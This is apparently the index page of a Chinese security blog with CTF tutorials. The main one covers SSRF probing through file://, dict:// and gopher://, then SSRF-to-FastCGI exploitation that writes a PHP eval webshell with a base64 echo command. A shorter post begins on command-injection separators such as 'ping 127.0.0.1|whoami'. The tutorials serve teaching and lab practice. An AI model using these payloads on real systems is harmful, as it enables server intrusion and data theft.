<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icon.jpg?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icon.jpg?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
<meta property="og:title" content="Biscuit19_">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Biscuit19_">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Biscuit19_">
<meta name="twitter:card" content="summary"><title>Biscuit19_</title><link ref="canonical" href="http://example.com/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"100px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Biscuit19_</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/15/SSRF-1/">SSRF-1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-01-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-01-15</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="What-is-SSRF"   >
          <a href="#What-is-SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#What-is-SSRF" class="headerlink" title="What is SSRF"></a>What is SSRF</h1>
      <p>​    ssrf就是我们本来只能访问服务器上的公开资源，但是我们通过服务器给我们的方法、接口，利用服务器发送请求，访问内网系统。</p>
<p>​    服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>

        <h1 id="探测SSRF"   >
          <a href="#探测SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#探测SSRF" class="headerlink" title="探测SSRF"></a>探测SSRF</h1>
      <p>探测漏洞</p>
<p>检测file：url=file:///etc/passwd</p>
<p>首先验证SSRF是否存在，可以通过获取远程服务器上的一些资源(比如图片)，看能否访问</p>
<p>随便访问一个图片：</p>
<p>url=<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/img_convert/822dd24dc3c881eb85e56e67514287b5.png" >https://img-blog.csdnimg.cn/img_convert/822dd24dc3c881eb85e56e67514287b5.png</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>有回显就是有漏洞(当然用dict协议也可以)</p>

        <h2 id="漏洞代码："   >
          <a href="#漏洞代码：" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞代码：" class="headerlink" title="漏洞代码："></a>漏洞代码：</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init(<span class="variable">$url</span>);<span class="comment">//初始化一个curl会话（连接）</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);<span class="comment">//执行这个会话并输出到浏览器</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="CURL"   >
          <a href="#CURL" class="heading-link"><i class="fas fa-link"></i></a><a href="#CURL" class="headerlink" title="CURL"></a>CURL</h2>
      <p><strong>CURL</strong>用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。</p>
<p>如不带有任何参数时，curl 就是发出 GET 请求。</p>
<blockquote>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://www.example.com</span><br></pre></td></tr></table></div></figure>
</blockquote>
<p>上面命令向<code>www.example.com</code>发出 GET 请求，服务器返回的内容会在命令行输出。</p>
<p>（同样的，在php中执行curl_exec就是在浏览器输出）</p>

        <h1 id="SSRF伪协议"   >
          <a href="#SSRF伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF伪协议" class="headerlink" title="SSRF伪协议"></a>SSRF伪协议</h1>
      
        <h2 id="file"   >
          <a href="#file" class="heading-link"><i class="fas fa-link"></i></a><a href="#file" class="headerlink" title="file://"></a>file://</h2>
      <p>file协议是用于访问本地计算机的文件，格式：file:///文件路径，如你在URL中输入</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br><span class="line">file:<span class="comment">///var/www/html/index.php</span></span><br><span class="line">file:<span class="comment">///var/www/html/flag.php</span></span><br></pre></td></tr></table></div></figure>

<p>就能在浏览器中访问到这个文件的内容</p>
<p>（为什么file后是三个///：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//blog.csdn.net/article/category/7191777</span></span><br><span class="line">file:<span class="comment">///article/category/7191777</span></span><br><span class="line">URL结构为scheme:[<span class="comment">//[user:password@]host[:port]][/]path[?query][#fragment]</span></span><br><span class="line">我们的file协议没有host，所以/拼在了一起，变成三个/</span><br></pre></td></tr></table></div></figure>

<p>）</p>
<p>示例：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></div></figure>


        <h2 id="dict"   >
          <a href="#dict" class="heading-link"><i class="fas fa-link"></i></a><a href="#dict" class="headerlink" title="dict://"></a>dict://</h2>
      <p>字典服务器协议，可以返回一个tcp端口提供的服务的响应内容</p>
<p>多用于端口扫描，看某个端口有没有开   dict://127.0.0.1:{port}  让服务器访问自己的本机端口</p>
<p>示例：访问本机8000-9000端口</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8000</span>,<span class="number">9001</span>):</span><br><span class="line">   url = <span class="string">f&#x27;http://challenge-3383045a96676aec.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:<span class="subst">&#123;port&#125;</span>&#x27;</span></span><br><span class="line">   re=requests.get(url)</span><br></pre></td></tr></table></div></figure>




        <h2 id="gopher"   >
          <a href="#gopher" class="heading-link"><i class="fas fa-link"></i></a><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h2>
      <p>Gopher用于访问不同站点的资源，在www之前它是最主要的信息检索工具，但现在多用www，但gopher协议支持发出GET、POST请求，所以gopher协议是ssrf利用中最强大的协议。</p>
<p><img src="https://pic2.zhimg.com/80/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.png" alt="img"></p>

        <h3 id="Gopher协议格式："   >
          <a href="#Gopher协议格式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Gopher协议格式：" class="headerlink" title="Gopher协议格式："></a><strong>Gopher协议格式</strong>：</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher:<span class="comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>gopher会吞掉一个字符，所以要在数据前多加一个字符（任意）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.119:2333/_abcd    这里加了_</span><br></pre></td></tr></table></div></figure></li>
<li><p>gopher的默认端口是70</p>
</li>
<li><p>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
</li>
</ul>

        <h3 id="构造HTTP请求"   >
          <a href="#构造HTTP请求" class="heading-link"><i class="fas fa-link"></i></a><a href="#构造HTTP请求" class="headerlink" title="构造HTTP请求"></a>构造HTTP请求</h3>
      <p>一个POST请求（至少含有以下这4个参数，且length要对，length就是携带参数内容的长度）</p>
<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">key</span>=ba<span class="number">8</span>dfa<span class="number">58</span>bd<span class="number">67278</span>b<span class="number">23</span>d<span class="number">3</span>d<span class="number">7</span>bffcb<span class="number">49</span>f<span class="number">84</span></span></span><br></pre></td></tr></table></div></figure>


        <h3 id="转码"   >
          <a href="#转码" class="heading-link"><i class="fas fa-link"></i></a><a href="#转码" class="headerlink" title="转码"></a>转码</h3>
      <p>1、问号 ？需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a, 用工具转只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束 </p>
<p>如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3Dba8dfa58bd67278b23d3d7bffcb49f84</span><br></pre></td></tr></table></div></figure>

<p>把%0A替换成%0D%0A，结尾加上%0D%0A，问号?替换为%3f(这个请求里没有问号),变为:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3Dba8dfa58bd67278b23d3d7bffcb49f84%0D%0A</span><br></pre></td></tr></table></div></figure>

<p>加上 gopher://127.0.0.1:80/_</p>
<p>gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3Dba8dfa58bd67278b23d3d7bffcb49f84%0D%0A</p>
<p>这个就是完整的一个gopher发送的一个post请求</p>

        <h3 id="构造上传文件请求"   >
          <a href="#构造上传文件请求" class="heading-link"><i class="fas fa-link"></i></a><a href="#构造上传文件请求" class="headerlink" title="构造上传文件请求"></a>构造上传文件请求</h3>
      <p>同理,将一个POST文件包编码</p>
<p>编码脚本:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="comment"># 输入要构造的post请求包</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=ba8dfa58bd67278b23d3d7bffcb49f84&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># url编码,python3.0后的编码器 urlencode更新后改为quote_plus</span></span><br><span class="line">payload = urllib.parse.quote(<span class="built_in">str</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># 替换</span></span><br><span class="line">payload = payload.replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0d%0a&quot;</span>).replace(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;%3f&quot;</span>) + <span class="string">&quot;%0d%0a&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 1次url编码\n&quot;</span>, payload)</span><br><span class="line">payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0d%0a&quot;</span>).replace(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;%3f&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 2次url编码\n&quot;</span>, payload)</span><br></pre></td></tr></table></div></figure>

<p><strong>注:构造文件包时，不能用浏览器中的f12的表头，不全，要用burpsuite抓取来构造</strong></p>

        <h2 id="其他可用协议"   >
          <a href="#其他可用协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他可用协议" class="headerlink" title="其他可用协议:"></a>其他可用协议:</h2>
      <p>sftp://</p>
<p>ldap://</p>
<p>tftp://</p>

        <h1 id="FastCGI协议漏洞"   >
          <a href="#FastCGI协议漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#FastCGI协议漏洞" class="headerlink" title="FastCGI协议漏洞"></a>FastCGI协议漏洞</h1>
      <p>详解CGI <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/itbsl/p/9828776.html#%E4%BB%8B%E7%BB%8D" >https://www.cnblogs.com/itbsl/p/9828776.html#%E4%BB%8B%E7%BB%8D</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>CGI”通用网关接口”（Common Gateway Interface），是一种应用层协议，解决 Web 服务器与 PHP 应用（或其他语言）之间的通信，用于http服务器来与其他程序间的接口，FastCGI是一个可伸缩地、高速地在HTTP服务器和动态脚本语言间通信的接口，它把语言和服务器（容器）分离。</p>
<p>（这里的服务器是指Apache、 Nginx 、IIS这种服务器、容器，也叫做服务器中间件）</p>

        <h2 id="运行原理"   >
          <a href="#运行原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2>
      <p><img src="https://img-blog.csdnimg.cn/img_convert/9df5a627629ec0de6077660c7cb587e6.png" alt="img"></p>
<p>当访问动态页面如PHP时，容器不能直接返回内容，需要调用FastCGI这个接口来启动php解释器，接下来由PHP解释器完成解析，处理请求，并返回结果给容器，最后由容器返回响应。</p>

        <h2 id="攻击原理"   >
          <a href="#攻击原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2>
      <p>在PHP应用中，PHP-FPM就是一个FastCGI进程管理器，是对于 FastCGI 协议的具体实现，他来处理Web服务器的所有请求：</p>
<p><img src="https://image.3001.net/images/20211021/1634804251_6171221ba0f61a19c7eeb.png!small" alt="image-20210317142528149"></p>
<p>在使用fastcgi时，中间件有两种与PHP-FPM通信的方式：</p>
<ul>
<li>TCP模式：FPM在本机开一个端口，监听本机9000端口，由中间件把FastCGI包发给这个9000端口，FPM接受后解析处理。</li>
<li>Unix进程通信模式：通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。上述原理图中提到的<strong>Socket 通信</strong>即为此模式。</li>
</ul>
<p>所以说，如果我们想攻击这个协议，就必须是TCP模式，我们构造攻击包发给9000端口，我们直接与FPM通信。</p>
<p>​    而这种端口肯定极少开放在公网，所以我们没法直接与9000端口通信，这时就需要利用SSRF漏洞来用服务器本机与它的9000端口通信来实现攻击。</p>

        <h3 id="FaseCGI协议包结构："   >
          <a href="#FaseCGI协议包结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#FaseCGI协议包结构：" class="headerlink" title="FaseCGI协议包结构："></a>FaseCGI协议包结构：</h3>
      <figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/<span class="number">1.0</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="number">12345</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;<span class="number">80</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/<span class="number">1.1</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>其中SCRIPT_FILENAME参数决定我们要执行哪个PHP文件，但我们还需任意执行命令，这就需要用到PHP.ini中的一个设置项：auto_prepend_file</p>
<p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件。</p>
<p>若我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么在任意php文件执行前，都会先包含（执行）php://input 里的内容，而php://input里存放着的是POST请求中的原始数据流，也就是POST请求的原始内容。</p>
<p>而利用php://input还需要allow_url_include=on，也就是说我们需要修改phpini中这两个参数，恰好PHP-FPM的环境变量PHP_VALUE、PHP_ADMIN_VALUE可以设置php.ini的配置，所以我们最终构造出这样的fastcgi包：</p>
<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/<span class="number">1.0</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="number">12345</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;<span class="number">80</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/<span class="number">1.1</span>&#x27;,</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php:<span class="comment">//input&#x27;,</span></span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当这两个配置修改成功后，我们把要执行的代码放到fastcgi包的Body里，就可以任意执行了。（网上并没有说是放在哪个包里，是http包还是cgi包，我尝试了http包，没有效果，也不清楚为什么php://input读不到东西）</p>

        <h2 id="攻击条件："   >
          <a href="#攻击条件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击条件：" class="headerlink" title="攻击条件："></a>攻击条件：</h2>
      <ul>
<li>PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件（题目环境已满足）；</li>
<li>知道题目环境中的一个PHP文件的绝对路径；</li>
<li>PHP-FPM使用TCP模式，监听在本机9000端口</li>
<li>有SSRF漏洞</li>
</ul>

        <h3 id="php-input补充"   >
          <a href="#php-input补充" class="heading-link"><i class="fas fa-link"></i></a><a href="#php-input补充" class="headerlink" title="php://input补充"></a>php://input补充</h3>
      <p>php://input能访问请求（POST）的原始数据的只读流， 通过输入流以文件读取方式取得未经处理的POST原始数据，也就是说，我们发送的POST请求，都在php://input中，可以把php://input当作一个全局变量来看，但他不能读取enctype=”multipart/form-data” 或Get 请求的数据。</p>
<p>所以有这样的一句话木马：@eval(file_get_contents(‘php://input’))</p>

        <h2 id="示例"   >
          <a href="#示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#示例" class="headerlink" title="示例"></a>示例</h2>
      <p>我们利用SSRF漏洞来打fastcgi时，需要构造fastcgi包，这时我们利用一个工具gopherus来生成对应的fastcgi包：（gopherus可以帮我们生成各种漏洞协议的gopher包，这里我们生成的时fastcgi漏洞协议的gopher包）</p>
<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202201150146973.png" alt="image-20220115013000732"></p>
<p>其中，第一个参数是我们已知的一个php文件的绝对路径，也就是包中的SCRIPT_FILENAME，第二个参数是我们相要执行的任意linux命令，这里不用我们写php，这个工具会帮我们生成。</p>
<p>在用linux命令写入webshell时，使用base64编码写入更加易用，这样可以避免php webshell本身的特殊字符：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原视webshell：<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">BAse64：PD9waHAgQGV2YWwoJF9QT1NUWydoYWNrJ10pOyA/Pg==</span><br><span class="line">Linux文件写入命令：</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydoYWNrJ10pOyA/Pg==&quot;</span> | base64 -d &gt;/<span class="keyword">var</span>/www/html/shell.php</span><br></pre></td></tr></table></div></figure>

<p>最后就得到了生成的gopher协议数据，我们利用SSRF执行这个gopher协议数据，就成功的写入了我们的webshell。</p>

        <h2 id="总结："   >
          <a href="#总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2>
      <ol>
<li>gopher是利用SSRF，给本地的某个端口/服务发请求的，FPM运行在本地的一个端口/服务，我们用gopher给FPM发请求，发的请求的格式是FasgCGI格式的，gopherus帮我们生成fastcgi格式的gopher包。</li>
<li>在fastcgi包中，我们设置了所有文件先包含php://input，在post请求中写入了我们写入webshell的php恶意代码，恶意代码会被包含，执行。</li>
<li>ssrf漏洞处执行了gopher包，向FPM发送fastcgi包，FPM收到fastcgi包，执行了php文件，php文件执行了写入webshell的命令。</li>
</ol>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行-文件包含</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-11-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-11-28</span></span></div></header><div class="post-body"><div class="post-excerpt"><pre><code> 命令执行漏洞的利用
</code></pre>

        <h2 id="Windows系统常用管道符："   >
          <a href="#Windows系统常用管道符：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Windows系统常用管道符：" class="headerlink" title="Windows系统常用管道符："></a>Windows系统常用管道符：</h2>
      <p>管道符    含义<br>|    直接执行后面的语句，例如：ping 127.0.0.1|whoami<br>||    如果前面执行的语句执行报错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami<br>&amp;    如果前面的语句为假，则直接执行后面的语句，前面的语句可真可假，例如：ping 127.0.0.1&amp;whoami<br>&amp;&amp;    如果前面的语句为假，则直接报错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami</p>

        <h2 id="Linux系统支持的管道符："   >
          <a href="#Linux系统支持的管道符：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux系统支持的管道符：" class="headerlink" title="Linux系统支持的管道符："></a>Linux系统支持的管道符：</h2>
